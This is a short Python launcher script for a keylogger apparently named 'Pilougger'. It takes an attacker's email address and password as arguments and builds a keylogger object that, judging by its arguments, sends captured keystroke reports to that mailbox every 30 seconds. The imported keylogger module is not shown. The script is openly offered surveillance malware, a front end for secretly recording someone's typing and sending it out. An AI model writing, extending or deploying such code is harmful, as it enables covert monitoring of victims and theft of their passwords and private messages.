#!/usr/bin/env python

import keylogger
import optparse
import pyfiglet
from colorama import init
from termcolor import colored


ascii_banner = pyfiglet.figlet_format("Pilougger\n By Zeckers")
print(ascii_banner)

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-m", "--mail", dest="mail", help="mail to send report")
    parser.add_option("-p", "--password", dest="password", help="mail's password")
    (options, arguments) = parser.parse_args()
    if not options.mail:
        parser.error("[-] Please specify a mal to send report, use --help for more info")
    if not options.password:
        parser.error("[-] Please specify a password, use --help for more info")
    return options


options = get_arguments()
my_keylogger = keylogger.Keylogger(30, options.mail, options.password)
